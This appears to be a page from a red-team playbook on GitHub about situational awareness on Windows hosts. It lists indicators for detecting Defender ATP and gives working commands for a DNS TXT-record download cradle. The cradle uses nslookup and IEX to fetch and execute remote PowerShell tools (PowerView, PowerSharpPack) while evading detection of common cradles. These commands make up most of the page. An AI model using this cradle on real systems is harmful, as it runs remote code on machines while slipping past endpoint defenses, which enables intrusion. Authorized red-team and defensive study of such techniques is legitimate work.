# 5.2 Situational Awareness

## Table of Contents

- [Windows Advanced Threat Protection (ATP)](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5.2-Situational-Awareness.md#windows-advanced-threat-protection-atp)
- [Avoid Invoke-Expression (IEX) and Invoke-WebRequest (IWR)](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5.2-Situational-Awareness.md#avoid-invoke-expression-iex-and-invoke-webrequest-iwr)

## Windows Advanced Threat Protection (ATP)

### Information

Process:
- MsSense.exe

Service:
- Display name: Windows Defender Advanced Threat Protection Service

Name:
- Sense

Registry:
- HKLM\SOFTWARE\Policies\Microsoft\Windows Advanced Threat Protection

File Paths:
- C:\Program Files\Windows Defender Advanced Threat Protection\

### Check Registry

```c
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows Advanced Threat Protection /s
```

### Check Service

```c
C:\> sc query sense
PS C:\> Get-Service Sense
```

### Process

```c
C:\> tasklist | findstr /i mssense.exe
```

## Avoid Invoke-Expression (IEX) and Invoke-WebRequest (IWR)

Instead of using `IEX` and `IWR` within assessments, try this:

* Host a text record with the payload at one of the unburned domains

| Name | Type | Value | TTL |
| --- | --- | --- | --- |
| cradle1 | TXT | "IEX(New-Object Net.WebClient).DownloadString($URI)" | 3600 |

```c
C:\> powershell . (nslookup -q=txt cradle1.domain.example)[-1]
```

```c
PS C:\> (nslookup -q=txt cradle1.domain.example)[-1]
```

```c
PS C:\> powershell '$URI=""""https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1"""";'(nslookup -q=txt cradle1.domain.example)[-1]';Get-Domain'
```

Example with `PowerSharpPack`.

```c
C:\> powershell
PS C:\> (nslookup -q=txt cradle1.domain.example)[-1]
PS C:\> powershell '$URI=""""https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1"""";'(nslookup -q=txt cradle1.example.domain)[-1]';PowerSharpPack'
```

<p align="center">
  <img src="https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/files/bypass.png">
</p>

### Previous

- [5 Installation](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5-Installation.md)
- [5.1 Persistence](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5.1-Persistence.md)

### Next

- [6 Command-and-Control](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/6-Command-and-Control/6-Command-and-Control.md)
